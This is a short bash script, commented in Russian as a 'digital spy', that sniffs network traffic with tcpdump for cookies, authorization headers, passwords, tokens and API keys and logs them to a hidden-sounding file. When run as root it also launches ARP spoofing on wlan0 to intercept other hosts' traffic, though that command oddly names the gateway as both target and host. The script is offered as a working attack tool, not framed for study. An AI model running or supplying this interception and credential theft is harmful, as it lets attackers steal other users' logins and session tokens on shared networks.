#!/bin/bash
# Цифровой шпион — слушает сеть и собирает ценные данные

echo "[SNIFFER] Listening for secrets in network traffic..."

# Слушаем трафик и ищем паттерны
tcpdump -i any -A -s 0 -l 2>/dev/null | grep --line-buffered -E \
    "Cookie:|Authorization:|password=|token=|api_key=|secret=|Set-Cookie:" | \
    while read line; do
        echo "[SNIFFER] 🎯 $line" | tee -a ~/shadow_sniffed.txt
    done &

# Альтернатива — через ARP-spoof (требуется root)
if [ "$(whoami)" = "root" ]; then
    echo "[SNIFFER] Root — enabling ARP spoof..."
    arpspoof -i wlan0 -t $(ip route | grep default | awk '{print $3}') $(ip route | grep default | awk '{print $3}') 2>/dev/null &
fi

echo "[SNIFFER] Active. Results: ~/shadow_sniffed.txt"
